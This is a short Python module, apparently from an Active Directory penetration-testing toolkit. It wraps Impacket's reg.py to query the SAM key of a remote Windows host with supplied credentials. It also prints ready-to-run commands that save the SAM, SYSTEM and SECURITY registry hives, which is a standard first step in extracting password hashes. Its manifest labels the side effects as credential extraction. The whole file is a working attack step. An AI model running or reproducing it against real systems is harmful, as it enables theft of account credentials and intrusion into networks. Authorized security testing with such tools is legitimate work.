"""Remote registry operations — SAM/SYSTEM/SECURITY hive extraction."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.impacket.impacket_reg.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["registry_access", "credential_extraction"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1012"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)

    print("[*] Impacket reg.py: remote registry operations")
    print("[*] Target: {}".format(target))

    import subprocess, shutil
    reg = shutil.which("reg.py") or shutil.which("impacket-reg")
    if not reg:
        print("[!] reg.py (impacket) not found")
        return 1

    auth = cred.impacket_auth_string()
    cmd = [reg, auth + "@" + (target or ""), "query", "-keyName",
           "HKLM\\SAM\\SAM", "-s"]

    print("[*] CMD: {}".format(" ".join(cmd)))
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)

    print("\n[*] Hive save commands:")
    print("  reg.py {} save -keyName 'HKLM\\SAM' -o SAM".format(auth + "@" + (target or "")))
    print("  reg.py {} save -keyName 'HKLM\\SYSTEM' -o SYSTEM".format(auth + "@" + (target or "")))
    print("  reg.py {} save -keyName 'HKLM\\SECURITY' -o SECURITY".format(auth + "@" + (target or "")))

    return result.returncode
